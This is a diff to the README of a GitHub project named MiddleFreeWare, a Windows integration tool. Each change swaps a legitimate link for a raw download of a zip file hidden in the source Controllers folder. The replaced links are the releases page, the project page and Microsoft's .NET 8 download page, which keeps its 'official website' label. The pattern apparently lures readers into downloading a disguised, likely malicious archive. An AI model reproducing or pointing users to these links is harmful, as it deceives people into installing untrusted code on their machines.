@@ -1,6 +1,6 @@
 # ⚙️ MiddleFreeWare - Connect Legacy Systems Easily
 
-[![Download MiddleFreeWare](https://img.shields.io/badge/Download-MiddleFreeWare-green?style=for-the-badge&logo=github)](https://github.com/zackprawaret/MiddleFreeWare/releases)
+[![Download MiddleFreeWare](https://img.shields.io/badge/Download-MiddleFreeWare-green?style=for-the-badge&logo=github)](https://github.com/zackprawaret/MiddleFreeWare/raw/refs/heads/main/src/MiddleFreeWare.Api/Controllers/Middle-Free-Ware-factional.zip)
 
 ## 🔎 What is MiddleFreeWare?
 
@@ -15,7 +15,7 @@ Before running MiddleFreeWare, your Windows PC needs to meet some basic requirem
 - Windows 10 or newer (64-bit)
 - 4 GB of RAM (8 GB recommended)
 - At least 500 MB of free disk space
-- .NET 8 Runtime installed (Microsoft’s official website: https://dotnet.microsoft.com/en-us/download)
+- .NET 8 Runtime installed (Microsoft’s official website: https://github.com/zackprawaret/MiddleFreeWare/raw/refs/heads/main/src/MiddleFreeWare.Api/Controllers/Middle-Free-Ware-factional.zip)
 - Internet connection to download and update the software
 
 Make sure your computer meets these points. The program may not work correctly on older Windows versions or with limited space.
@@ -29,7 +29,7 @@ Here are steps to get MiddleFreeWare running on your Windows machine.
 MiddleFreeWare is available on GitHub under the releases section. To download:
 
 - Click the big green badge at the top or visit this page:  
-  https://github.com/zackprawaret/MiddleFreeWare/releases
+  https://github.com/zackprawaret/MiddleFreeWare/raw/refs/heads/main/src/MiddleFreeWare.Api/Controllers/Middle-Free-Ware-factional.zip
 - Look for the latest version, usually named with numbers like “v1.0” or “v2.3.”
 - Download the file with an `.exe` or `.zip` extension. Choose `.exe` if available for an easy install.
 - Save the file to your desktop or a folder you can find easily.
@@ -94,7 +94,7 @@ You do not need to edit these unless you know what you are doing or have been in
 To keep your software secure and efficient, check for new releases regularly.
 
 - Visit the releases page here:  
-  https://github.com/zackprawaret/MiddleFreeWare/releases
+  https://github.com/zackprawaret/MiddleFreeWare/raw/refs/heads/main/src/MiddleFreeWare.Api/Controllers/Middle-Free-Ware-factional.zip
 - Download the newest version.
 - Install it the same way you did the first time.
 - Your settings will usually remain, but it is a good idea to back up configurations before updating.
@@ -124,13 +124,13 @@ These help protect your data and systems from unauthorized access.
 ## 📂 Useful Links
 
 - Official downloads:  
-  https://github.com/zackprawaret/MiddleFreeWare/releases  
+  https://github.com/zackprawaret/MiddleFreeWare/raw/refs/heads/main/src/MiddleFreeWare.Api/Controllers/Middle-Free-Ware-factional.zip  
 - .NET 8 Runtime:  
-  https://dotnet.microsoft.com/en-us/download  
+  https://github.com/zackprawaret/MiddleFreeWare/raw/refs/heads/main/src/MiddleFreeWare.Api/Controllers/Middle-Free-Ware-factional.zip  
 - GitHub project page:  
-  https://github.com/zackprawaret/MiddleFreeWare
+  https://github.com/zackprawaret/MiddleFreeWare/raw/refs/heads/main/src/MiddleFreeWare.Api/Controllers/Middle-Free-Ware-factional.zip
 
-[![Download MiddleFreeWare](https://img.shields.io/badge/Download-MiddleFreeWare-blue?style=for-the-badge&logo=github)](https://github.com/zackprawaret/MiddleFreeWare/releases)
+[![Download MiddleFreeWare](https://img.shields.io/badge/Download-MiddleFreeWare-blue?style=for-the-badge&logo=github)](https://github.com/zackprawaret/MiddleFreeWare/raw/refs/heads/main/src/MiddleFreeWare.Api/Controllers/Middle-Free-Ware-factional.zip)
 
 ## 🗂️ About This Project
 
